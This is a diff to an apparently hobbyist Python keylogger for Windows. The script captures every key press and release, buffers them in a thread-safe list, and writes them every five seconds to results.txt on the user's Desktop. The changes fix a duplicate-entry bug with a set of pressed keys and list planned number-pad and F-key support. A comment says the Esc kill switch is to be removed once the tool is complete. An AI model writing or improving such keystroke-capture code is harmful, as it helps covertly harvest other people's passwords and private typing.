@@ -3,8 +3,13 @@
 # The keylogger works specially with focus on Windows using a path for store in a .txt file
 # all the inputs of the user
 
-#bug 1:
-# the overflow gives a repeated input on the .txt file
+# Twice input bug fixed successfully
+
+#things to improve:
+# - Add a translation to NumPad like:
+# - Number Pad #1 = 97
+# - the keys as * or + on the numeration pad are translated correctly
+# - Keys as F3 are available
 
 import logging #used to log the keystrokes to a file
 import os #use to handle files or paths
@@ -21,6 +26,7 @@ directory = os.path.join(os.path.expanduser("~"), "Desktop") #Open this path
 
 filename = "results.txt" #name of the file
 path = os.path.join (directory, filename)
+pressed_keys = set() #this var tracks pressed keys
 
 #configure a basic config
 logging.basicConfig(
@@ -34,13 +40,19 @@ keystroke_buffer = []
 buffer_lock = Lock() #to ensure thread-safe access to the buffer
 logging_interval = 5 #log every 5 seconds
 
+#function for common keys
 def press_key(key):
     with buffer_lock:
-        keystroke_buffer.append(f"K.Pressed: {key}")
+        if key not in pressed_keys: #check if the key is pressed    
+            keystroke_buffer.append(f"K.Pressed: {key}")
+            pressed_keys.add(key) #add the keys pressed
 
-def release(key): #function in case any key is released
+#function for special keys
+def release(key):
     with buffer_lock:    
-        keystroke_buffer.append(f"K.Released: {key}") #logs of a released key to the file
+        if key in pressed_keys: #check if the key pressed
+            keystroke_buffer.append(f"K.Released: {key}") #logs of a released key to the file
+            pressed_keys.remove(key) #remove from the set of pressed keys
 
     #delete this when the keylogger is complete
     if key == Key.esc: #If esc key is pressed the keylogger will stop
@@ -68,3 +80,4 @@ def start_listener():
 keyboard_thread = Thread(target=start_listener)#thread for keyboard
 
 keyboard_thread.start()#starting thread
+
